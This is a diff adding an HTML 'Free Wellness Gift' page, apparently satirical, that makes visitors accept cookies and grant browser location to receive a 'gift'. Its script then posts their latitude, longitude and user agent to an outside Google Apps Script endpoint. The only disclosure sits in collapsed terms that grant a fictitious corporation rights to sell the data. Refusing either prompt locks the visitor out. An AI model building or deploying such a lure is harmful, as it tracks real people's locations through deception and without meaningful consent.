@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Wellness Gift</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial Rounded MT Bold', sans-serif;
+      background-color: #d9ecf2;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .container {
+      max-width: 500px;
+      padding: 20px;
+    }
+    .hidden { display: none; }
+    .terms-link { font-size: 0.8rem; color: #999; text-decoration: none; margin-top: 20px; display: inline-block; }
+    .terms { display: none; margin-top: 10px; font-size: 0.8rem; color: #666; }
+    button { padding: 10px 20px; margin: 10px; cursor: pointer; border: none; border-radius: 4px; background: #77c3d2; color: white; font-weight: bold; }
+    button:hover { background: #5bb2c0; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="cookieConsent">
+      <h2>This site uses cookies</h2>
+      <p>We use cookies to enhance your compliance. Do you accept?</p>
+      <button onclick="acceptCookies()">Accept</button>
+      <button onclick="denyCookies()">Decline</button>
+    </div>
+
+    <div id="locationRequest" class="hidden">
+      <h2>Almost there...</h2>
+      <p>Please allow location access to receive your gift.</p>
+      <button onclick="requestLocation()">Allow Location</button>
+      <button onclick="denyLocation()">Decline</button>
+    </div>
+
+    <div id="giftPage" class="hidden">
+      <h1>Welcome to your Free Wellness Gift</h1>
+      <p>Access granted. You're exactly where you need to be.</p>
+      <div id="gif-container"><img src="https://media.giphy.com/media/l4FGuhL4U2WyjdkaY/giphy.gif" alt="gift" width="100%"></div>
+      <a href="#" class="terms-link" onclick="document.getElementById('terms').style.display = 'block'; return false;">terms & conditions</a>
+      <div id="terms" class="terms">
+        <p>By accessing this page, you grant LOVE SUCKER LOUNGE CORP unrestricted rights to collect, archive, and monetise your real-time location. This data may be sold, bartered, or used in AI training to improve your future compliance.</p>
+        <p>Namaste.</p>
+      </div>
+    </div>
+
+    <div id="deniedPage" class="hidden">
+      <h2>Oops!</h2>
+      <p>You must accept both cookies and location access to proceed.</p>
+      <button onclick="location.reload()">Go Back and Try Again</button>
+    </div>
+  </div>
+
+  <script>
+    let cookiesAccepted = false;
+
+    function acceptCookies() {
+      cookiesAccepted = true;
+      document.getElementById('cookieConsent').classList.add('hidden');
+      document.getElementById('locationRequest').classList.remove('hidden');
+    }
+
+    function denyCookies() {
+      showDenied();
+    }
+
+    function denyLocation() {
+      showDenied();
+    }
+
+    function showDenied() {
+      document.querySelectorAll('.container > div').forEach(el => el.classList.add('hidden'));
+      document.getElementById('deniedPage').classList.remove('hidden');
+    }
+
+    function requestLocation() {
+      if (!cookiesAccepted) {
+        showDenied();
+        return;
+      }
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            showGiftPage();
+            sendData(position.coords.latitude, position.coords.longitude);
+          },
+          function(error) {
+            showDenied();
+          }
+        );
+      } else {
+        showDenied();
+      }
+    }
+
+    function showGiftPage() {
+      document.querySelectorAll('.container > div').forEach(el => el.classList.add('hidden'));
+      document.getElementById('giftPage').classList.remove('hidden');
+    }
+
+    function sendData(lat, lng) {
+      fetch('https://script.google.com/macros/s/AKfycbwKt0kTVb1GJADt0igw_NQ-ESBOY9jLAYi-VaoZJ6U91DuBEAqwc2IlcgRGjxUG9JGr/exec', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          lat: lat,
+          lng: lng,
+          ip: '', // IP may not be retrievable without backend; optional
+          ua: navigator.userAgent
+        })
+      });
+    }
+  </script>
+</body>
+</html>
